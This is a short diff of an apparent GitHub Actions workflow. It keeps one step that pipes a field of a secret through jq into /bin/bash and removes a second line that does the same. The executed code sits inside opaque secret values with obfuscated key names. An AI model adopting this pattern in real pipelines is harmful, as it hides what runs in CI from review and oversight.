@@ -17,7 +17,6 @@ jobs:
           t2: ${{ secrets.t2 }}
         run: |
           printf '%s' "$t2" | jq -r .ofsxk7 | /bin/bash
-          printf '%s' "$r49" | jq -r .ffwhb01 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
